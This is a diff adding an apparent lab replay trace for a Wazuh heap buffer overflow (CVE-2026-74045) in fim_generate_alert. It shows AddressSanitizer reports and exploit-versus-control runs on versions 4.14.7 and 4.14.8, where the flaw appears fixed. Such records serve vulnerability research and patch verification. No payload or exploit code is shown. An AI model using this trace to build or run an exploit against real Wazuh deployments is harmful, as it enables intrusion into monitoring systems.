@@ -1,0 +1,46 @@
+Wazuh CVE-2026-74045 direct-call sink replay — stable trace
+Replay: bash run.sh OUTDIR (from lab/frontier/wazuh2shell)
+Build: gcc 13.3.0, libcjson.so.1.7.17, ASan on for asan builds, off for plain
+
+[v4.14.7 exploit] asan
+mode=exploit input_len=228 alloc=459
+ERROR: AddressSanitizer: heap-buffer-overflow
+WRITE of size 528
+0 bytes after 459-byte region
+frame: fim_generate_alert (derived source slice)
+SUMMARY: AddressSanitizer: heap-buffer-overflow in vsnprintf
+
+[v4.14.7 control] asan
+mode=control input_len=406 alloc=815
+mode=control rc=0 output_len=93
+no ASan report
+
+[plain v4.14.7 exploit]
+mode=exploit input_len=228 alloc=459
+mode=exploit rc=0 output_len=527
+mode=exploit neighbor=: 'Q'
+
+[plain v4.14.7 control]
+mode=control input_len=406 alloc=815
+mode=control rc=0 output_len=93
+mode=control neighbor=ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
+
+[v4.14.8 exploit] asan
+mode=exploit input_len=228 alloc=459
+mode=exploit rc=0 output_len=527
+no ASan report
+
+[v4.14.8 control] asan
+mode=control input_len=406 alloc=815
+mode=control rc=0 output_len=93
+no ASan report
+
+[plain v4.14.8 exploit]
+mode=exploit input_len=228 alloc=459
+mode=exploit rc=0 output_len=527
+mode=exploit neighbor=ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
+
+[plain v4.14.8 control]
+mode=control input_len=406 alloc=815
+mode=control rc=0 output_len=93
+mode=control neighbor=ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
